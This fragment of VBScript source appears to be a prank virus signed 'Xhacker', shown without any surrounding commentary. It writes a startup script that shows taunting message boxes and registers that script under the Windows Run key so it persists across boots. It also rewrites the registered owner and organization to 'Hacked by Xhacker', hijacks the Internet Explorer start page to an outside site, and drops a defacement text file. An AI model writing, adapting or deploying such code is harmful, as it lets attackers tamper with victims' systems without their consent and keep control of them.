   Set FileObj = CreateObject("Scripting.FileSystemObject")
   file = "c:\autoexec.vbs"
   Set OutStream= FileObj.CreateTextFile (file, True, False)
   outstream.write(tline)
   OutStream.WriteBlankLines(1)

   OutStream.WriteLine " msgbox "" Your winsuck has been infected with a human virus called Xhacker "" & vbcrlf & "" This hacker don't stop programming things like that... "",vbcritical,""Error""  "
   OutStream.WriteLine " msgbox "" Don't Worry !! , it's not a danger virus "" , vbexclamation , ""Don't worry !"" "
   OutStream.WriteLine " msgbox "" Please Visit : http://coolhack.free.fr/ "",vbinformation,""Visit:"" "

   Set WshShell = CreateObject("WScript.Shell")
   WshShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Rundllvbs","c:\autoexec.vbs"
   WshShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","Hacked by Xhacker"
   WshShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization","http://coolhack.free.fr"
   WshShell.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://coolhack.free.fr"

   Set FileObj = CreateObject("Scripting.FileSystemObject")
   file = "c:\coolhack.txt"
   Set OutStream= FileObj.CreateTextFile (file, True, False)
   outstream.write(tline)
   OutStream.WriteLine "This computer has been hacked by Xhacker"
   OutStream.WriteLine "http://coolhack.free.fr/"
